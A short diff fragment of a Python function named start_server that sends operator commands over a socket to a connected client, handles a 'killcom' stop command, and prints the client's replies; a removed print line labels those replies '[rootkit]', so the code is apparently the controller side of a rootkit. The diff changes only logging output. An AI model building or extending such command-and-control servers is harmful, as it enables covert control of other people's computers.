@@ -90,7 +90,6 @@ def start_server():
 						# Send the command
 						to_send = line + "\n"
 						connection.sendall(to_send.encode())
-						print(f"📤 [>] Command sent: {line}")
 
 						# Special command: global stop
 						if line.lower() == "killcom":
@@ -110,7 +109,7 @@ def start_server():
 				try:
 					data = connection.recv(STD_BUFFER_SIZE).decode()
 					if data:
-						print(f"\n📥 [rootkit] {data.strip()}")
+						print(f"{data.strip()}")
 					else:
 						break
 				except Exception as e:
